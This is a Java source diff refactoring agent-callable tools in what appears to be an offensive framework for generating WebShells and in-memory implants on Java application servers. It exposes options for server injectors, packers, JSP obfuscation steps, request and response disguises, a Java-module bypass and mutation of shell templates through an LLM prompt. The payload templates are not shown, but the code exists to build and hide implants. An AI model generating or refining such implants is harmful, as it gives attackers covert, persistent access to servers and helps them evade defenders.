@@ -11,14 +11,17 @@ import org.leo.core.entity.Puppet;
 import org.leo.core.generator.GeneratedArtifact;
 import org.leo.core.generator.GenerationRequest;
 import org.leo.core.runtime.PuppetRuntime;
-import org.leo.jmg.ServerInjectorMapper;
-import org.leo.jmg.ShellGenerator;
 import org.leo.jmg.ShellGeneratorConfig;
+import org.leo.jmg.ServletNamespace;
 import org.leo.jmg.TargetJavaVersion;
+import org.leo.jmg.catalog.GeneratorCatalog;
+import org.leo.jmg.generation.MemoryShellGenerationCommand;
+import org.leo.jmg.generation.ShellGenerationOutcome;
+import org.leo.jmg.generation.ShellGenerationService;
+import org.leo.jmg.generation.WebShellGenerationCommand;
 import org.leo.jmg.mem.packer.PackerRegistry;
-import org.leo.jmg.mem.packer.PackerCompatibilityResult;
-import org.leo.jmg.mem.packer.Util;
-import org.leo.jmg.mem.packer.jsp.JspObfuscationPipeline;
+import org.leo.jmg.mem.packer.PackerResources;
+import org.leo.jmg.mem.packer.jsp.JspObfuscationStepCatalog;
 import org.leo.service.PuppetService;
 import org.leo.service.disguise.DisguiseService;
 import org.leo.service.generator.ScriptGeneratorService;
@@ -46,6 +49,9 @@ import java.util.Map;
  */
 @Component
 public class ShellGeneratorTools {
+
+    private static final ShellGenerationService SHELL_GENERATION_SERVICE =
+            new ShellGenerationService();
 
     private static final String TEMPLATE_SHELL_JSP  = "/memshell-template/shell.jsp.txt";
     private static final String TEMPLATE_SHELL1_JSP = "/memshell-template/shell1.jsp.txt";
@@ -100,18 +106,19 @@ public class ShellGeneratorTools {
           "生成 WebShell 或内存马前调用此工具确认合法参数范围，不要凭记忆猜测。")
     public Map<String, Object> getShellGeneratorMeta() {
         Map<String, Object> data = new LinkedHashMap<>();
-        data.put("serverInjectorTypes", ServerInjectorMapper.getAllServerInjectorMapAsString());
-        data.put("packerTypes", ServerInjectorMapper.getSupportedPackerTypesHierarchy());
+        data.put("serverInjectorTypes", GeneratorCatalog.getServerInjectorMap());
+        data.put("serverProtocolInjectorTypes", GeneratorCatalog.getProtocolInjectorMap());
+        data.put("packerTypes", PackerRegistry.getHierarchy());
         data.put("packerObfuscationSteps", PackerRegistry.getPackerObfuscationStepsMap());
         data.put("packerCompatibility", PackerRegistry.getCompatibilityMap());
         data.put("packerAvailability", PackerRegistry.getAvailabilityMap());
         data.put("targetJavaVersions", targetJavaVersions());
-        data.put("servletNamespaces", ServerInjectorMapper.getSupportedServletNamespaces());
+        data.put("servletNamespaces", ServletNamespace.valuesAsStrings());
         Map<String, Object> transportProtocols = new LinkedHashMap<>();
         transportProtocols.put("webshell", ShellGeneratorConfig.getSupportedWebShellProtocols());
         transportProtocols.put("memoryshell", ShellGeneratorConfig.getSupportedMemoryShellProtocols());
         data.put("transportProtocols", transportProtocols);
-        data.put("obfuscationSteps", JspObfuscationPipeline.getStepDescriptors());
+        data.put("obfuscationSteps", JspObfuscationStepCatalog.getDescriptors());
         data.put("runtimeGenerators", scriptGeneratorService.getMetadata());
         return data;
     }
@@ -132,7 +139,7 @@ public class ShellGeneratorTools {
         result.put("puppetName",    puppet.getPuppetName());
         result.put("runtime",       isBlank(puppet.getType())
                 ? "java" : puppet.getType().trim().toLowerCase(Locale.ROOT));
-        result.put("protocol",      puppet.getProtocol() != null ? puppet.getProtocol() : "http");
+        result.put("protocol",      toGeneratorProtocol(puppet.getProtocol()));
         result.put("reqDisguiseId", puppet.getReqDisguiseId());
         result.put("respDisguiseId", puppet.getRespDisguiseId());
 
@@ -271,7 +278,7 @@ public class ShellGeneratorTools {
           "reqDisguiseId / respDisguiseId：请求/响应伪装器 ID，必填，从 getPuppetShellConfig 获取。" +
           "shellType：JSP 或 JSPX，必填。" +
           "coreClassName：核心类名，留空自动生成。" +
-          "protocol：http / httpchunk（HTTPCHUNK 仅 JSP/JSPX），从 getPuppetShellConfig 获取，默认 http。" +
+          "protocol：http / httpchunk，从 getPuppetShellConfig 获取，默认 http。" +
           "targetJavaVersion：目标运行时版本，可选 auto / 6 / 7 / 8 / 9+ / 17+，默认 auto。" +
           "servletNamespace：Servlet API 命名空间，可选 auto / javax / jakarta，默认 auto（当前解析为 javax）。" +
           "respCode：响应状态码，默认 200。" +
@@ -289,38 +296,21 @@ public class ShellGeneratorTools {
         Disguise reqDisguise  = requireDisguise(reqDisguiseId,  "reqDisguiseId");
         Disguise respDisguise = requireDisguise(respDisguiseId, "respDisguiseId");
 
-        String shellTypeUpper = requireNonBlank(shellType, "shellType").toUpperCase();
-        if (!"JSP".equals(shellTypeUpper) && !"JSPX".equals(shellTypeUpper)) {
-            throw new IllegalArgumentException("shellType 必须是 JSP 或 JSPX，当前值: " + shellType);
-        }
-
-        ShellGeneratorConfig.Builder builder = ShellGeneratorConfig
-                .builder(reqDisguise, respDisguise)
-                .respCode(respCode != null ? respCode : 200);
-
-        if (!isBlank(protocol))      builder.protocol(protocol.trim());
-        if (!isBlank(targetJavaVersion)) builder.targetJavaVersion(targetJavaVersion.trim());
-        if (!isBlank(servletNamespace)) builder.servletNamespace(servletNamespace.trim());
-        if (!isBlank(coreClassName)) builder.coreClassName(coreClassName.trim());
-        if (jspObfuscationSteps != null) builder.jspObfuscationSteps(jspObfuscationSteps);
-
-        ShellGeneratorConfig config = builder.build();
-        ShellGenerator generator = new ShellGenerator(config);
-
-        String shell = "JSP".equals(shellTypeUpper)
-                ? generator.generateJspShell()
-                : generator.generateJspxShell();
-
-        // 摘要（不含完整代码）
-        Map<String, Object> meta = new LinkedHashMap<>();
-        meta.put("type",          shellTypeUpper);
-        meta.put("coreClassName", config.getCoreClassName());
-        meta.put("protocol",      config.getProtocol());
-        meta.put("targetJavaVersion", config.getTargetJavaVersion().getValue());
-        meta.put("obfuscationSeed", Long.toString(config.getObfuscationSeed()));
-        meta.put("servletNamespace", config.getEffectiveServletNamespace().getValue());
-        meta.put("lines",         shell.split("\n").length);
-        meta.put("chars",         shell.length());
+        WebShellGenerationCommand command =
+                WebShellGenerationCommand.builder(
+                                reqDisguise, respDisguise, shellType)
+                        .coreClassName(coreClassName)
+                        .protocol(protocol)
+                        .targetJavaVersion(targetJavaVersion)
+                        .servletNamespace(servletNamespace)
+                        .responseCode(respCode)
+                        .obfuscationSteps(jspObfuscationSteps)
+                        .build();
+        ShellGenerationOutcome outcome =
+                SHELL_GENERATION_SERVICE.generateWebShell(command);
+        String shell = outcome.getContent();
+        Map<String, Object> meta =
+                new LinkedHashMap<String, Object>(outcome.getMetadata());
 
         String resultId = resultStore.put(shell, meta);
 
@@ -346,7 +336,8 @@ public class ShellGeneratorTools {
           "serverType：目标应用服务器类型，必填，可通过 getShellGeneratorMeta 获取。" +
           "shellType：注入器形态，必填，可通过 getShellGeneratorMeta 获取。" +
           "packerType：打包器类型，必填，可通过 getShellGeneratorMeta 获取。" +
-          "protocol：http / websocket，从 getPuppetShellConfig 获取，默认 http；HTTPCHUNK 仅支持 JSP/JSPX WebShell。" +
+          "protocol：http / httpchunk / websocket，从 getPuppetShellConfig 获取，默认 http；" +
+          "httpchunk 下 shellType 使用协议元数据公开的普通形态名，生成器会自动选择 Chunk 模板。" +
           "targetJavaVersion：目标运行时版本，可选 auto / 6 / 7 / 8 / 9+ / 17+，默认 auto；" +
           "servletNamespace：Servlet API 命名空间，可选 auto / javax / jakarta，默认 auto（当前解析为 javax）；" +
           "urlPattern：http 模式默认 /*；websocket 模式为端点路径，默认 /leo，必须以 / 开头且不能含 *。" +
@@ -377,66 +368,30 @@ public class ShellGeneratorTools {
         Disguise reqDisguise  = requireDisguise(reqDisguiseId,  "reqDisguiseId");
         Disguise respDisguise = requireDisguise(respDisguiseId, "respDisguiseId");
 
-        String normalizedProtocol = ShellGeneratorConfig.normalizeProtocol(protocol);
-        boolean webSocketBuild = "websocket".equals(normalizedProtocol)
-                || "WebSocketInjector".equals(shellType);
-
-        ShellGeneratorConfig.Builder builder = ShellGeneratorConfig
-                .builder(reqDisguise, respDisguise)
-                .header(webSocketBuild ? emptyIfNull(headerName) : requireNonBlank(headerName, "headerName"),
-                        webSocketBuild ? emptyIfNull(headerValue) : requireNonBlank(headerValue, "headerValue"))
-                .serverType(requireNonBlank(serverType, "serverType"))
-                .shellType(requireNonBlank(shellType,   "shellType"))
-                .packerType(requireNonBlank(packerType, "packerType"))
-                .urlPattern(isBlank(urlPattern) ? (webSocketBuild ? "/leo" : "/*") : urlPattern.trim())
-                .abstractTranslet(isAbstractTranslet != null && isAbstractTranslet)
-                .respCode(respCode != null ? respCode : 200);
-
-        if (!isBlank(protocol))          builder.protocol(protocol.trim());
-        if (!isBlank(targetJavaVersion)) builder.targetJavaVersion(targetJavaVersion.trim());
-        if (!isBlank(servletNamespace))  builder.servletNamespace(servletNamespace.trim());
-        if (byPassJavaModule != null)    builder.byPassJavaModule(byPassJavaModule);
-        if (jspObfuscationSteps != null) builder.jspObfuscationSteps(jspObfuscationSteps);
-        if (!isBlank(customJspTemplate)) builder.customJspTemplate(customJspTemplate.trim());
-
-        if (!isBlank(coreClassName)) builder.coreClassName(coreClassName.trim());
-        if (!isBlank(injectorClassName)) builder.injectorClassName(injectorClassName.trim());
-        if (!isBlank(shellClassName)) builder.shellClassName(shellClassName.trim());
-
-        ShellGeneratorConfig config = builder.build();
-        ShellGenerator generator = new ShellGenerator(config);
-        String code = generator.generateFormattedInjector();
-        PackerCompatibilityResult compatibility = PackerRegistry.evaluateCompatibility(
-                config.getPackerType(),
-                config.getTargetJavaVersion(),
-                config.isByPassJavaModule()
-        );
-        java.util.ArrayList<String> compatibilityWarnings =
-                new java.util.ArrayList<String>(compatibility.getWarnings());
-        compatibilityWarnings.addAll(config.getCompatibilityWarnings());
-
-        // 摘要（不含完整代码）
-        Map<String, Object> meta = new LinkedHashMap<>();
-        meta.put("packerType",        config.getPackerType());
-        meta.put("shellType",         config.getShellType());
-        meta.put("protocol",          config.getProtocol());
-        meta.put("serverType",        config.getServerType());
-        meta.put("coreClassName",     config.getCoreClassName());
-        meta.put("injectorClassName", config.getInjectorClassName());
-        meta.put("shellClassName",    config.getShellClassName());
-        meta.put("urlPattern",        config.getUrlPattern());
-        meta.put("isAbstractTranslet", config.isAbstractTranslet());
-        meta.put("byPassJavaModule",  config.isByPassJavaModule());
-        meta.put("targetJavaVersion", config.getTargetJavaVersion().getValue());
-        meta.put("obfuscationSeed", Long.toString(config.getObfuscationSeed()));
-        meta.put("compatibilityWarnings", compatibilityWarnings);
-        meta.put("servletNamespace", config.getEffectiveServletNamespace().getValue());
-        meta.put("headerConfig",      config.isWebSocketProtocol()
-                ? "WebSocket endpoint: " + config.getUrlPattern()
-                : headerName + " : " + headerValue);
-        meta.put("templateMutated",   !isBlank(customJspTemplate));
-        meta.put("lines",             code.split("\n").length);
-        meta.put("chars",             code.length());
+        MemoryShellGenerationCommand command =
+                MemoryShellGenerationCommand.builder(reqDisguise, respDisguise)
+                        .header(headerName, headerValue)
+                        .serverType(serverType)
+                        .injectorName(shellType)
+                        .packerType(packerType)
+                        .protocol(protocol)
+                        .targetJavaVersion(targetJavaVersion)
+                        .servletNamespace(servletNamespace)
+                        .urlPattern(urlPattern)
+                        .coreClassName(coreClassName)
+                        .injectorClassName(injectorClassName)
+                        .shellClassName(shellClassName)
+                        .abstractTranslet(isAbstractTranslet)
+                        .bypassJavaModule(byPassJavaModule)
+                        .responseCode(respCode)
+                        .obfuscationSteps(jspObfuscationSteps)
+                        .customJspTemplate(customJspTemplate)
+                        .build();
+        ShellGenerationOutcome outcome =
+                SHELL_GENERATION_SERVICE.generateMemoryShell(command);
+        String code = outcome.getContent();
+        Map<String, Object> meta =
+                new LinkedHashMap<String, Object>(outcome.getMetadata());
 
         String resultId = resultStore.put(code, meta);
 
@@ -457,13 +412,13 @@ public class ShellGeneratorTools {
         if (isBlank(packerType)) throw new IllegalArgumentException("packerType 不能为空");
         String pt = packerType.trim();
         if ("ClassLoaderJSP".equalsIgnoreCase(pt)) {
-            return Util.loadTemplateFromResource(TEMPLATE_SHELL_JSP);
+            return PackerResources.loadTemplate(TEMPLATE_SHELL_JSP);
         }
         if ("DefineClassJSP".equalsIgnoreCase(pt)) {
             boolean bypass = Boolean.TRUE.equals(byPassJavaModule);
-            return Util.loadTemplateFromResource(bypass ? TEMPLATE_SHELL2_JSP : TEMPLATE_SHELL1_JSP);
+            return PackerResources.loadTemplate(bypass ? TEMPLATE_SHELL2_JSP : TEMPLATE_SHELL1_JSP);
         }
-        return Util.loadTemplateFromResource(TEMPLATE_SHELL1_JSP);
+        return PackerResources.loadTemplate(TEMPLATE_SHELL1_JSP);
     }
 
     private String buildMutationPrompt(String baseTemplate, String mutationHint, String lastError) {
@@ -524,8 +479,12 @@ public class ShellGeneratorTools {
         return value == null || value.isBlank();
     }
 
-    private String emptyIfNull(String value) {
-        return value == null ? "" : value.trim();
+    private static String toGeneratorProtocol(String puppetProtocol) {
+        if (puppetProtocol == null || puppetProtocol.isBlank()) {
+            return "http";
+        }
+        String normalized = puppetProtocol.trim().toLowerCase(Locale.ROOT);
+        return "httpchunked".equals(normalized) ? "httpchunk" : normalized;
     }
 
     private List<String> targetJavaVersions() {
